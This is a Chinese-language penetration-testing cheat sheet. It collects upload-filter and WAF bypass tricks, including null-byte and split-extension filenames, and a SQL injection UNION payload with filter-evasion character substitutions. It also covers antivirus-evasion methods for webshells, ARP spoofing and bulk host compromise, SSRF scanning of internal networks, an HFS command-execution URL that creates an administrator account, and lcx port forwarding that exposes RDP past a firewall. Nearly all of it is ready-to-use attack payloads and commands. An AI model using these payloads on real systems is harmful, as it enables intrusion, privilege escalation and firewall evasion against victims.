# 工具箱

otype=3
JSFinder

get-executionpolicy
nishang framework

## php

open_basedir
safe_mod

disable_functions

## 数据库CVE

vulhub.org

## WAF绕过

Content-Disposition
filename
Content-Type
filename="x.php%00.jpg"
filename=php.php
"php.php
filename= ;filename="php.php"
filename="x.
p
h
p
"

## sql注入

%23a%0A是一种常见的SQL注释语法

%23表示字符#的URL编码形式，用于注释掉SQL语句中#后面的所有内容。这种方式也被称为"哈希注释"。
%0A表示换行符的URL编码形式，用于在SQL语句中插入一个新行，从而避免一些简单的换行符过滤器。这种方式也被称为"换行符注入"。
因此，将%23a%0A插入到SQL注入攻击负载中，可以将注入语句的后面部分注释掉，并在新行中插入后续攻击负载。例如，假设以下是一段受攻击的SQL查询语句：

SELECT * FROM users WHERE username = 'admin' AND password = '$password';
如果攻击者想要绕过该查询并获取所有用户数据，他们可以尝试使用以下攻击负载：

' or 1=1 %23a%0A UNION SELECT *FROM users--
在这个攻击负载中，%23a%0A将注释掉后面的AND password = '$password'部分，并在新行中插入攻击负载"UNION SELECT* FROM users--"。这个攻击负载将返回所有用户数据，因为它使用了UNION操作符来将攻击者的查询结果合并到原始查询结果中。

- 等价字符
 空格： %20 + () %0a %09 %a0 %0b %0c %0d /**/
 = : like regexp liker <> !=
 and : &&
 or: xor & ^ ||

## 文件上传

- 客户端
>
> 1. js检查
>
- 服务端

### 检查后缀

#### 黑名单

>  1. 上传特殊可解析后缀
>  2. 上传.htaccess
>  3. 后缀大小写绕过
>  4. 点绕过
>  5. 空格绕过
>  6. ::$DATA绕过
>  7. 配合解析漏洞
   > 7.1 Apache陌生后缀解析漏洞
   > 7.2 Apache换行解析漏洞
 > 8. 双后缀名绕过
>
#### 白名单
>
>  1. MIME绕过
>  2. %00截断
>  3. 0x00截断
>
### 检查内容
>
>  1. 文件头检查
>  2. 突破getimagesize()
>  3. 突破exif_imagetype()
>  4. 二次渲染
>
### 代码逻辑
 >
 > 1.条件竞争

## 免杀

- 函数替换
- 自定义函数
- 回调函数
- 编码绕过
- 函数字符串拆分组合

[免杀-https://xz.aliyun.com/t/5152](https://xz.aliyun.com/t/5152 )

## 横向渗透

135批量抓鸡
arp欺骗-netfuke-kali arpspoof
 -内网渗透
  主机发现->存活主机(MAC,IP,计算机名)
  扫描主机-> port system 漏洞等
  攻击主机
  取得权限

## SSRF

**扫内网**
a : 192.168.38.129
b : 27.19.126.82 192.168.0.101
c : 192.168.0.106
a能链接b
b能链接c
a不能链接c
攻击者a访问： <http://192.168.0.101/ssrf/index.php?url=192.168.0.106:80>
通过b的ssrf漏洞去探针c的80端口 **192.168.0.1 ~ 192.168.0.255**

HFS命令执行
<http://127.0.0.1/?search==%00{.exec|cmd> /c net user DEF DEFHACKER123 /add.}
<http://127.0.0.1/?search==%00{.exec|cmd> /c net localgroup Administrators  DEF  /add.}

## 端口转发

实现数据连接 绕过防火墙
让内网主动将数据给到外网
a可以链接b b不能链接a
a充当内网地址 b充当外网地址

a 192.168.38.130
lcx.exe -slave 192.168.0.106 3333 127.0.0.1 3389
将本地的3389端口转发到192.168.0.106的3333端口上去

b 192.168.0.106
lcx.exe -listen 3333 1111
监听本地3333端口转发到1111
然后链接本地的1111
